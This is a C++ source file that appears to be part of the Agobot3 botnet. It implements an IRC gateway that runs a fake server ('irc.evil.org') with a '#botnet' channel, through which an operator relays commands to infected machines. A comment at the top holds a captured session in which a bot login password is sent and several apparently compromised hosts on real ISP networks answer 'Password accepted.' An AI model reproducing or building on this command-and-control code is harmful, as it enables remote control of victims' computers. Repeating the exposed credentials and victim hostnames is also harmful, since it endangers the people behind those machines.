#include "main.h"
#include "mainctrl.h"
#include "utility.h"
#include "ircgate.h"

/*
NICK Ago
USER Ago ago irc.secsup.uu.net :Ago
NOTICE AUTH :*** Looking up your hostname...
NOTICE AUTH :*** Checking Ident
NOTICE AUTH :*** Found your hostname
:irc.secsup.org 001 Ago :Welcome to the Internet Relay Network Ago
:irc.secsup.org 002 Ago :Your host is irc.secsup.org[63.98.19.242/6667], running version 2.8/hybrid-6.3.1
NOTICE Ago :*** Your host is irc.secsup.org[63.98.19.242/6667], running version 2.8/hybrid-6.3.1
:irc.secsup.org 003 Ago :This server was created Tue Jan 21 2003 at 16:57:32 GMT
:irc.secsup.org 004 Ago irc.secsup.org 2.8/hybrid-6.3.1 oOiwszcrkfydnxb biklmnopstve
:irc.secsup.org 005 Ago WALLCHOPS PREFIX=(ov)@+ CHANTYPES=#& MAXCHANNELS=100 MAXBANS=25 NICKLEN=9 TOPICLEN=120 KICKLEN=90 NETWORK=EFnet CHANMODES=b,k,l,imnpst KNOCK MODES=4 :are supported by this server
:irc.secsup.org 251 Ago :There are 5968 users and 105973 invisible on 57 servers
:irc.secsup.org 252 Ago 434 :IRC Operators online
:irc.secsup.org 254 Ago 43934 :channels formed
:irc.secsup.org 255 Ago :I have 2919 clients and 1 servers
:irc.secsup.org 265 Ago :Current local  users: 2919  Max: 4026
:irc.secsup.org 266 Ago :Current global users: 111941  Max: 125618
:irc.secsup.org 250 Ago :Highest connection count: 4027 (4026 clients) (151553 since server was (re)started)
:irc.secsup.org 375 Ago :- irc.secsup.org Message of the Day - 
:irc.secsup.org 372 Ago :- This is a server
:irc.secsup.org 372 Ago :- like many others
:irc.secsup.org 372 Ago :- it is serving
:irc.secsup.org 372 Ago :- 
:irc.secsup.org 372 Ago :- please don't abuse it
:irc.secsup.org 372 Ago :- or I will be mad
:irc.secsup.org 376 Ago :End of /MOTD command.
:Ago MODE Ago :+i
JOIN #bla
:irc.secsup.org 475 Ago #bla :Cannot join channel (+k)
JOIN #bla0r
:Ago!~Ago@frb9-d9bb4a80.pool.mediaWays.net JOIN :#bla0r
:irc.secsup.org MODE #bla0r +nt
:irc.secsup.org 353 Ago = #bla0r :@Ago 
:irc.secsup.org 366 Ago #bla0r :End of /NAMES list.
MODE #bla0r
WHO #bla0r
:irc.secsup.org 324 Ago #bla0r +tn 
:irc.secsup.org 329 Ago #bla0r 1059462330
:irc.secsup.org 352 Ago #bla0r ~Ago frb9-d9bb4a80.pool.mediaWays.net irc.secsup.org Ago H@ :0 Ago
:irc.secsup.org 315 Ago #bla0r :End of /WHO list.
PART #bla0r :Client exiting
:Ago!~Ago@frb9-d9bb4a80.pool.mediaWays.net PART #bla0r


PRIVMSG #bla0r :.login Ago bunghole
:[Ago]cnns!~woinggg@AGrenoble-203-1-1-126.w80-15.abo.wanadoo.fr PRIVMSG #bla0r :Password accepted.
:[Ago]vzta!~woinggg@4.22.139.57 PRIVMSG #bla0r :Password accepted.
:[Ago]ffrp!~woinggg@node-d1d4a28b.mdw.onnet.us.uu.net PRIVMSG #bla0r :Password accepted.
:[Ago]pdak!~woinggg@CPE00e018f32af5-CM014400121364.cpe.net.cable.rogers.com PRIVMSG #bla0r :Password accepted.
:[Ago]uquc!~woinggg@24-90-163-103.nj.rr.com PRIVMSG #bla0r :Password accepted.
:[Ago]ifgu!~woinggg@12-224-69-181.client.attbi.com PRIVMSG #bla0r :Password accepted.
:[Ago]osaw!~woinggg@h24-65-104-107.ed.shawcable.net PRIVMSG #bla0r :Password accepted.
:aizs!~hznge@133.43.174.38 PRIVMSG #bla0r :Password accepted.
:[Ago]tzgx!zxdcc@cm61-18-166-86.hkcable.com.hk PRIVMSG #bla0r :Password accepted.
*/

CIRCGate::CIRCGate() { m_bRunning=true; m_sListenSock=-1; m_sServerSock=-1; }
CIRCGate::~CIRCGate() throw() { m_bRunning=false; if(m_sListenSock!=-1) xClose(m_sListenSock); if(m_sServerSock!=-1) xClose(m_sServerSock); }
void CIRCGate::run() throw()
{	// Create the shared listen socket on IRC port
	sockaddr_in issin; memset(&issin, 0, sizeof(issin)); issin.sin_family=AF_INET;
	issin.sin_addr.s_addr=INADDR_ANY; issin.sin_port=htons(6667);
	m_sListenSock=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(m_sListenSock!=-1) {
#ifdef WIN32
		WSAAsyncSelect(m_sListenSock, 0, WM_USER + 1, FD_READ);
#endif
		bind(m_sListenSock, (sockaddr *)&issin, sizeof(issin)); listen(m_sListenSock, 10); }
	else // Uuhhh, spew something
	{	g_cMainCtrl.m_cConsDbg.Log(1, "CIRCGate(0x%8.8Xh): Port %d is already bound, or something wicked happened!\n", this, 6667);
		m_bRunning=false; return; }
		

	while(m_bRunning)
	{	// Accept an incoming connection from the shared listen socket
		sockaddr_in cssin; socklen_t cssin_len=sizeof(cssin);
		m_sServerSock=accept(m_sListenSock, (sockaddr *)&cssin, &cssin_len);
		if(m_sServerSock!=-1) // We got a client
		{	// Get the remote ip via getpeername, and store it in m_sClientIp
			sockaddr sa; socklen_t sas=sizeof(sa); memset(&sa, 0, sizeof(sa)); getpeername(m_sServerSock, &sa, &sas);
			char szTemp[32]; sprintf(szTemp, "%d.%d.%d.%d", (unsigned char)sa.sa_data[2], (unsigned char)sa.sa_data[3], \
				(unsigned char)sa.sa_data[4], (unsigned char)sa.sa_data[5]);
			m_sClientIp.Assign(szTemp); g_cMainCtrl.m_cConsDbg.Log(3, "CIRCGate(0x%8.8Xh): Connection from \"%s\" accepted!\n", this, m_sClientIp.CStr());
			IRCLoop(); xClose(m_sServerSock); } }

	if(m_sListenSock!=-1) xClose(m_sListenSock); }

bool CIRCGate::RecvLine(int sSocket, char *szBuffer, int iBufSize)
{	int iBufIndex=0; szBuffer[iBufIndex]='\0'; bool bReceiving=true;
	while(iBufIndex<iBufSize && &szBuffer[iBufIndex] && bReceiving)
	{	int iRead=xRead(sSocket, &szBuffer[iBufIndex], 1);
		if(!iRead || iRead==-1) return false; szBuffer[iBufIndex+1]='\0';
		if(szBuffer[iBufIndex]=='\n' || !szBuffer[iBufIndex]) bReceiving=false;
		iBufIndex++; }
	szBuffer[iBufSize-1]='\0'; szBuffer[iBufIndex-2]='\0'; return true; }

void CIRCGate::IRCLoop()
{	CString sWelcome, sAutojoin;
	// NICK
	char szTemp[4096]; m_bRunning=RecvLine(m_sServerSock, szTemp, sizeof(szTemp));
	CTokenizer tok(szTemp, " \r\n"); tok.Next(m_sClientNick); tok.Next(m_sClientNick);
	// USER
	m_bRunning=RecvLine(m_sServerSock, szTemp, sizeof(szTemp));

	sWelcome.Format(":irc.evil.org 001 %s :Welcome to the Internet Relay Network %s\r\n",
		m_sClientNick.CStr(), m_sClientNick.CStr());
	xWrite(m_sServerSock, sWelcome.CStr(), sWelcome.GetLength());
	sWelcome.Format(":irc.evil.org 002 %s :Your host is irc.evil.org[127.0.0.1/6667], running version agobot3\r\n", m_sClientNick.CStr());
	xWrite(m_sServerSock, sWelcome.CStr(), sWelcome.GetLength());


	sAutojoin.Format(":%s!~none@anon.ip JOIN :#botnet\r\n", m_sClientNick.CStr());
	xWrite(m_sServerSock, sAutojoin.CStr(), sAutojoin.GetLength());
	sAutojoin.Format(":irc.evil.org MODE #botnet +smtn\r\n");
	xWrite(m_sServerSock, sAutojoin.CStr(), sAutojoin.GetLength());
	sAutojoin.Format(":irc.evil.org 353 %s = #botnet :@%s\r\n", m_sClientNick.CStr(), m_sClientNick.CStr());
	xWrite(m_sServerSock, sAutojoin.CStr(), sAutojoin.GetLength());
	sAutojoin.Format(":irc.evil.org 366 %s #botnet :End of /NAMES list.\r\n", m_sClientNick.CStr());
	xWrite(m_sServerSock, sAutojoin.CStr(), sAutojoin.GetLength());

	while(m_bRunning)
	{	m_bRunning=RecvLine(m_sServerSock, szTemp, sizeof(szTemp));
		CString sReply, sRecv; sRecv.Assign(szTemp);
		char *szTokens[256]; szTokens[0]=strtok(szTemp, " ");
		for(int i=1;i<256;i++) szTokens[i]=strtok(NULL, " ");
		
		if(!strcmp(szTokens[0], "MODE"))
		{	sReply.Format(":irc.evil.org 324 %s #botnet +smtn\r\n", m_sClientNick.CStr());
			xWrite(m_sServerSock, sReply.CStr(), sReply.GetLength());
			sReply.Format(":irc.evil.org 329 %s #botnet 1059462330\r\n", m_sClientNick.CStr());
			xWrite(m_sServerSock, sReply.CStr(), sReply.GetLength()); }
		else if(!strcmp(szTokens[0], "WHO"))
		{	sReply.Format(":irc.evil.org 352 %s #botnet ~none anon.ip irc.evil.org %s H@ :0 %s\r\n", m_sClientNick.CStr(), m_sClientNick.CStr(), m_sClientNick.CStr());
			xWrite(m_sServerSock, sReply.CStr(), sReply.GetLength());
			sReply.Format(":irc.evil.org 315 %s #botnet :End of /WHO list.\r\n", m_sClientNick.CStr());
			xWrite(m_sServerSock, sReply.CStr(), sReply.GetLength()); }
		else if(!strcmp(szTokens[0], "PRIVMSG"))
		{	char *szText=strstr(sRecv.CStr(), ":"); szText+=1;
			Send(szText, strlen(szText)); }
		else
			g_cMainCtrl.m_cConsDbg.Log(1, "CIRCGate(0x%8.8Xh): Got \"%s\"\n", this, szTemp);
	}
}

void CIRCGate::Recv(char *szData, int iDataLen, message *pMsg)
{	CString sMsgBuf;
	if(strstr(pMsg->szParams, g_cMainCtrl.m_sUniqueId.CStr()))
		sMsgBuf.Format(":%s!~none@anon.ip PRIVMSG #botnet :%s\r\n", m_sClientNick.CStr(), szData);
	else
		sMsgBuf.Format(":%s!~none@anon.ip PRIVMSG #botnet :%s\r\n", (char*)(strstr(pMsg->szParams, ":"))+1, szData);
	xWrite(m_sServerSock, sMsgBuf.CStr(), sMsgBuf.GetLength()); }
